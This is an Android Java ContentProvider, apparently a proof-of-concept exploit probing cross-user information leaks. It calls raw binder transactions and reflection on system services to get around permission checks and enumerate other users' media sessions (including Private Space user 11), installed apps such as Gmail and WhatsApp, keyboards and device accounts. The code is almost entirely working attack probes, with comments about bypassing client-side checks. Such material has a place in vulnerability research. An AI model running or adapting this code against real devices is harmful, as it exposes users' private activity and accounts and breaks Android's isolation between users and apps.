package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class MediaSessionLeakProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("media")) {
            probeMediaSession(cursor);
        } else if (path != null && path.contains("notification")) {
            probeNotificationService(cursor);
        } else if (path != null && path.contains("input")) {
            probeInputMethod(cursor);
        } else if (path != null && path.contains("account")) {
            probeAccountManager(cursor);
        } else {
            probeMediaSession(cursor);
            probeNotificationService(cursor);
            probeInputMethod(cursor);
            probeAccountManager(cursor);
        }

        return cursor;
    }

    private void probeMediaSession(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("media_session");
        if (binder == null) { cursor.addRow(new Object[]{"media_session", "no_binder"}); return; }
        String desc = "android.media.session.ISessionManager";

        // getSessions - returns active media sessions (can reveal what other apps are playing)
        // TX code for getSessions varies; let's use the MediaSessionManager API
        try {
            android.media.session.MediaSessionManager msm = (android.media.session.MediaSessionManager)
                getContext().getSystemService("media_session");
            // getActiveSessions requires MEDIA_CONTENT_CONTROL permission... but let's try
            // via reflection to bypass the client-side check
            Method getActive = msm.getClass().getMethod("getActiveSessions", android.content.ComponentName.class);
            java.util.List<?> sessions = (java.util.List<?>) getActive.invoke(msm, (Object) null);
            if (sessions != null) {
                cursor.addRow(new Object[]{"activeSessions", "count=" + sessions.size()});
                for (int i = 0; i < Math.min(sessions.size(), 10); i++) {
                    android.media.session.MediaController mc = (android.media.session.MediaController) sessions.get(i);
                    String pkg = mc.getPackageName();
                    android.media.MediaMetadata meta = mc.getMetadata();
                    String metaStr = "null";
                    if (meta != null) {
                        String title = meta.getString(android.media.MediaMetadata.METADATA_KEY_TITLE);
                        String artist = meta.getString(android.media.MediaMetadata.METADATA_KEY_ARTIST);
                        metaStr = "title=" + title + " artist=" + artist;
                    }
                    cursor.addRow(new Object[]{"session_" + i, "pkg=" + pkg + " meta=" + truncate(metaStr)});
                }
            } else {
                cursor.addRow(new Object[]{"activeSessions", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"activeSessions", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }

        // Try via binder directly
        // ISessionManager:
        // TX=1: createSession(String packageName, ISessionCallback cb, String tag, Bundle sessionInfo, int userId)
        // TX=2: getSessions(ComponentName componentName, int userId)
        // TX=3: dispatchMediaKeyEvent(String packageName, boolean asSystemService, KeyEvent keyEvent, boolean needWakeLock)
        // TX=4: dispatchMediaKeyEventToSessionAsSystemService(String packageName, KeyEvent keyEvent, MediaSession.Token token)
        // TX=7: getSession2Tokens(int userId)

        // Try getSessions for user 0
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // null ComponentName
            data.writeInt(0); // userId
            binder.transact(2, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getSessions_u0", "SUCCESS avail=" + avail});
                if (avail >= 4) {
                    int count = reply.readInt();
                    cursor.addRow(new Object[]{"getSessions_u0_count", String.valueOf(count)});
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getSessions_u0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getSessions_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try getSessions for user 11 (Private Space)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // null ComponentName
            data.writeInt(11); // userId - Private Space
            binder.transact(2, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getSessions_u11", "SUCCESS avail=" + avail});
                if (avail >= 4) {
                    int count = reply.readInt();
                    cursor.addRow(new Object[]{"getSessions_u11_count", String.valueOf(count)});
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getSessions_u11", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getSessions_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // getSession2Tokens - reveals active Session2 instances
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // userId
            binder.transact(7, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getSession2Tokens_u0", "SUCCESS avail=" + avail});
                if (avail >= 4) {
                    int count = reply.readInt();
                    cursor.addRow(new Object[]{"session2_count", String.valueOf(count)});
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getSession2Tokens_u0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getSession2Tokens_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeNotificationService(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("notification");
        if (binder == null) { cursor.addRow(new Object[]{"notification", "no_binder"}); return; }
        String desc = "android.app.INotificationManager";

        // TX=3/4 returned bool=0 last time. Need to figure out what they are.
        // In Android 16 INotificationManager:
        // TX=3: areNotificationsEnabled(String pkg)
        // TX=4: areNotificationsEnabledForPackage(String pkg, int uid)
        // Let's test TX=3 with different packages

        // Test TX=3 with our own package first
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            binder.transact(3, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0 && reply.dataAvail() >= 4) {
                cursor.addRow(new Object[]{"notif_own_tx3", "enabled=" + reply.readInt()});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"notif_own_tx3", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"notif_own_tx3", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Test TX=3 with various packages
        String[] pkgs = {"com.google.android.gm", "com.android.chrome",
                         "com.google.android.apps.messaging", "com.whatsapp",
                         "com.totally.fake.app", "com.google.android.dialer",
                         "com.google.android.apps.photos"};
        for (String pkg : pkgs) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                binder.transact(3, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0 && reply.dataAvail() >= 4) {
                    int val = reply.readInt();
                    cursor.addRow(new Object[]{"notif3_" + pkg.substring(pkg.lastIndexOf('.')+1), "val=" + val});
                } else {
                    String msg = null;
                    try { msg = reply.readString(); } catch (Exception ignored) {}
                    cursor.addRow(new Object[]{"notif3_" + pkg.substring(pkg.lastIndexOf('.')+1), "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"notif3_" + pkg.substring(pkg.lastIndexOf('.')+1), "ERR"});
            }
            data.recycle();
            reply.recycle();
        }

        // Test TX=4 (areNotificationsEnabledForPackage) with pkg + uid
        // This needs the exact UID which we don't know...
        // But if we pass wrong uid, does it still return?
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString("com.google.android.gm");
            data.writeInt(0); // uid 0 (wrong uid)
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0 && reply.dataAvail() >= 4) {
                cursor.addRow(new Object[]{"notif4_gm_uid0", "val=" + reply.readInt()});
            } else {
                String msg = null;
                try { msg = reply.readString(); } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"notif4_gm_uid0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"notif4_gm_uid0", "ERR"});
        }
        data.recycle();
        reply.recycle();

        // Try to use canShowBadge / getNotificationChannel as app oracle
        // TX=7 might be getNotificationChannel
        // TX=12 might be canShowBadge(String pkg, int uid)
        for (String pkg : new String[]{"com.google.android.gm", "com.totally.fake"}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                data.writeInt(10100); // uid guess
                binder.transact(12, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0 && reply.dataAvail() >= 4) {
                    cursor.addRow(new Object[]{"notif12_" + pkg.substring(pkg.lastIndexOf('.')+1), "val=" + reply.readInt()});
                } else {
                    String msg = null;
                    try { msg = reply.readString(); } catch (Exception ignored) {}
                    cursor.addRow(new Object[]{"notif12_" + pkg.substring(pkg.lastIndexOf('.')+1), "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"notif12_" + pkg.substring(pkg.lastIndexOf('.')+1), "ERR"});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeInputMethod(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("input_method");
        if (binder == null) { cursor.addRow(new Object[]{"ime", "no_binder"}); return; }
        String desc = "com.android.internal.view.IInputMethodManager";

        // getInputMethodList() - reveals what IMEs are installed (app enumeration)
        // getCurrentInputMethodSubtype() - reveals user's current keyboard language
        // getEnabledInputMethodList() - reveals user's enabled keyboards

        // Let's try getting the input method list via reflection on InputMethodManager
        try {
            android.view.inputmethod.InputMethodManager imm = (android.view.inputmethod.InputMethodManager)
                getContext().getSystemService("input_method");
            java.util.List<android.view.inputmethod.InputMethodInfo> methods = imm.getInputMethodList();
            cursor.addRow(new Object[]{"ime_count", String.valueOf(methods.size())});
            for (int i = 0; i < Math.min(methods.size(), 10); i++) {
                android.view.inputmethod.InputMethodInfo info = methods.get(i);
                cursor.addRow(new Object[]{"ime_" + i, info.getPackageName() + "/" + info.getId()});
            }

            java.util.List<android.view.inputmethod.InputMethodInfo> enabled = imm.getEnabledInputMethodList();
            cursor.addRow(new Object[]{"ime_enabled_count", String.valueOf(enabled.size())});
            for (int i = 0; i < Math.min(enabled.size(), 5); i++) {
                android.view.inputmethod.InputMethodInfo info = enabled.get(i);
                cursor.addRow(new Object[]{"ime_enabled_" + i, info.getPackageName() + "/" + info.getId()});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"ime", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }

        // getCurrentInputMethodSubtype - reveals language
        try {
            android.view.inputmethod.InputMethodManager imm = (android.view.inputmethod.InputMethodManager)
                getContext().getSystemService("input_method");
            android.view.inputmethod.InputMethodSubtype subtype = imm.getCurrentInputMethodSubtype();
            if (subtype != null) {
                cursor.addRow(new Object[]{"ime_subtype", "locale=" + subtype.getLocale() + " mode=" + subtype.getMode()});
            } else {
                cursor.addRow(new Object[]{"ime_subtype", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"ime_subtype", "ERR"});
        }
    }

    private void probeAccountManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("account");
        if (binder == null) { cursor.addRow(new Object[]{"account", "no_binder"}); return; }
        String desc = "android.accounts.IAccountManager";

        // getAccounts - extremely sensitive, reveals all accounts on device
        // getAccountsByFeatures - oracle for account type installation
        // hasAccountAccess - can check if a specific account type exists

        // Try via AccountManager API
        try {
            android.accounts.AccountManager am = android.accounts.AccountManager.get(getContext());
            // getAccounts() requires GET_ACCOUNTS (removed in API 26+)
            android.accounts.Account[] accounts = am.getAccounts();
            cursor.addRow(new Object[]{"accounts_count", String.valueOf(accounts.length)});
            for (int i = 0; i < Math.min(accounts.length, 10); i++) {
                cursor.addRow(new Object[]{"acct_" + i, "type=" + accounts[i].type + " name=" + truncate(accounts[i].name)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"accounts", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }

        // Try getAccountsAsUser for user 11
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // response (null IAccountManagerResponse)
            data.writeString(null); // accountType (null = all)
            data.writeString(getContext().getOpPackageName()); // opPackageName
            data.writeInt(11); // userId
            binder.transact(4, data, reply, 0); // getAccountsAsUser is typically TX=4
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"accounts_u11", "SUCCESS avail=" + avail});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"accounts_u11", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"accounts_u11", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try getAccountsByTypeForPackage - can we check if specific account types exist?
        String[] accountTypes = {"com.google", "com.google.android.gm.legacyimap",
                                  "com.microsoft.workaccount", "com.samsung.account"};
        for (String type : accountTypes) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(type); // type
                data.writeString(getContext().getPackageName()); // callerPackage
                data.writeString(getContext().getOpPackageName()); // opPackageName
                // TX for getAccountsByTypeForPackage - varies
                binder.transact(5, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"acctType_" + type.replace(".", "_"), "OK avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"acctType_" + type.replace(".", "_"), "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"acctType_" + type.replace(".", "_"), "ERR"});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
